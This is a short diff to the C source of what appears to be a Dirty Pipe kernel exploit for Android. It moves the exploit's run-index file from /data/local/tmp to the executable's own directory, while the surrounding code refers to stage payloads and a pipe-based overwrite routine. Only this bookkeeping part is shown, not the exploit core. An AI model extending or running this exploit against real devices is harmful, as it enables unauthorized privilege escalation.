@@ -41,11 +41,6 @@
 
 #include "stage2-symbol.h"
 
-#ifndef TMP_DIR
-#define TMP_DIR "/data/local/tmp"
-#endif
-#define RUN_INDEX TMP_DIR "/dirtypipe-run-index"
-
 extern char stage1_start[];
 extern char stage1_data[];
 extern uint32_t stage1_len;
@@ -145,10 +140,13 @@ int overwrite(int p[2], int fd, loff_t offset, const char *data, int data_size) 
 	return 0;
 }
 
-int load_run_index() {
+int load_run_index(const char *base_dir) {
+	char run_index_path[500];
 	int run_index = 0;
 
-	int fd = open(RUN_INDEX, O_RDONLY);
+	sprintf(run_index_path, "%s/dirtypipe-run-index", base_dir);
+
+	int fd = open(run_index_path, O_RDONLY);
 	if(fd >= 0){
 		char buf[100];
 		read(fd, buf, sizeof(buf) - 1);
@@ -162,7 +160,7 @@ int load_run_index() {
 		run_index = 0;
 	}
 
-	fd = open(RUN_INDEX, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+	fd = open(run_index_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
 	if(fd >= 0){
 		char buf[100];
 		sprintf(buf, "%d", run_index + 1);
@@ -253,7 +251,10 @@ int main(int argc, char **argv)
 		return EXIT_FAILURE;
 	}
 
-	int run_index = load_run_index();
+	char base_dir[256] = {};
+	readlink("/proc/self/exe", base_dir, sizeof(base_dir) - 1);
+	*strrchr(base_dir, '/') = 0;
+	int run_index = load_run_index(base_dir);
 
 	printf("Run index: %d\n", run_index);
 
